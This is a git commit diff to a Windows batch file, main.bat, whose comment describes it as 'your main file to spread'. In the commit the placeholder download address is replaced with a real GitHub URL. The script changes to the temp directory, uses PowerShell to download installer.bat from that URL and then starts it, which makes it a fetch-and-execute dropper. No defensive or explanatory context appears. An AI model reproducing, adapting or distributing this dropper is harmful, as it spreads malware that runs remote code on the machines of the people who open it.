503ca7e6b2c01dfb23dca185a609d9ecdeac0147
walks111551 <aidenwalka@gmail.com>
2024-11-20 18:41:02 -0600

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,5 +1,5 @@
 REM - This is your main file to spread.
 
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.bat' -OutFile installer.bat"
+Powershell -Command "Invoke-Webrequest 'https://github.com/walks111551/09672018256120856125/blob/main/installer.bat' -OutFile installer.bat"
 start installer.bat
